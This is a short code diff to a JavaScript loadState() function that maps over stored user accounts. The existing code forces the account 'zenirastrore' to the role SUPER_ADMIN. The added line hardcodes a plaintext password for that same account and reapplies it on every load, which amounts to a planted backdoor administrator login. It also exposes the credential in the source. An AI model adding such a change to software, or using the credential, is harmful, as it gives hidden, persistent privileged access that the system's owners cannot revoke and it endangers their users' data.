@@ -83,6 +83,7 @@ function loadState() {
     state.users = state.users.map(u => {
       if (u.username === 'zenirastrore') {
         u.role = 'SUPER_ADMIN';
+        u.password = encryptPassword('abu_ziyadh280292');
       }
       if (!u.password.startsWith('pbkdf2_sha256$')) {
         u.password = encryptPassword(u.password);
